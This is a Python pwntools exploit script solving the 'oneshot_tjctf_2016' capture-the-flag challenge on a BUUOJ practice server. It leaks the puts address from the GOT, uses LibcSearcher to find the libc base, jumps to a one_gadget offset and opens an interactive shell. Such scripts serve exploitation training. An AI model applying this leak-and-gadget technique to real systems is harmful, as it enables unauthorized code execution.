#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/23 10:25:02
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
if debug:
    sh = process('oneshot_tjctf_2016')
else:
    sh = remote("node3.buuoj.cn",27494)
elf = ELF('oneshot_tjctf_2016')
# libc = ELF()
puts_got = elf.got['puts']
sh.recvuntil("Read location?\n")
sh.sendline(str(puts_got))
sh.recvuntil("Value: 0x0000")
puts_addr = int(sh.recv(12),16)
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
one_gadget = [0x45216,0x4527a,0xf03a4,0xf1247]
one = libc_base + one_gadget[0]
sh.sendline(str(one))
sh.interactive()